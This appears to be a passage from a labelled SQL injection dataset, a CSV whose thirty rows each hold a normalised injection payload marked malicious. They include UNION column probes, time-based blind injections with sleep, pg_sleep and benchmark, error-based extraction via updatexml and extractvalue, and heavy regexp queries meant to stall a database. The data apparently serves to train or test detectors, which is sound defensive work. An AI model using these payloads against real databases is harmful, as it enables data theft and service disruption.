row_index,payload_norm,label,sqli_type_hint
7230,1 union all select null--,1,
7231,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ""%"" = """,1,
7232,1' where 8159 = 8159 union all select null#,1,
7233,"1"" ) as uuth where 8555 = 8555 union all select null,null#",1,
7234,"-6194"" or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",1,
7235,"select * from generate_series ( 3551,3551,case when ( 3551 = 6451 ) then 1 else 0 end ) limit 1--",1,
7236,"call regexp_substring ( repeat ( right ( char ( 2385 ) ,0 ) ,500000000 ) ,null ) --",1,
7237,-4313%' ) or 6872 = 6872 and ( '%' = ',1,
7238,1' ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 'eihl' = 'eihl,1,
7239,select ( case when ( 3140 = 4625 ) then 1 else 3140* ( select 3140 from master..sysdatabases ) end ) --,1,
7240,"-9861' union all select 5710,5710,5710,5710,5710--",1,
7241,"1 where 8273 = 8273 union all select null,null,null,null,null,null,null,null#",1,
7242,"1%' ) ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
7243,"1"" ) ) as swix where 2459 = 2459 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",1,
7244,"1 ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 8382 = 8382",1,
7245,1 ) as selm where 5759 = 5759,1,
7246,"-6112"" ) union all select 8203,8203,8203,8203,8203,8203,8203--",1,
7247,-8369 ) where 7234 = 7234 order by 1--,1,
7248,"1' or elt ( 6272 = 6272,sleep ( 5 ) )",1,
7249,"1"" ) ) ) union all select null,null#",1,
7250,"1 ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 2997 = 2997",1,
7251,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ""%"" = """,1,
7252,1'|| ( select 'zqwd' where 1647 = 1647 rlike sleep ( 5 ) ) ||',1,
7253,"1"" ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( ""fcpm"" = ""fcpm",1,
7254,1 where 2239 = 2239 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,1,
7255,1'|| ( select 'xemx' from dual where 4683 = 4683 or sleep ( 5 ) #,1,
7256,select ( case when ( 4291 = 6937 ) then 4291 else 4291* ( select 4291 from mysql.db ) end ) #,1,
7257,"1"" ) where 8462 = 8462 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",1,
7258,"-1055' union all select 7758,7758,7758,7758,7758,7758--",1,
7259,"-2630' ) ) as xavw where 6291 = 6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",1,
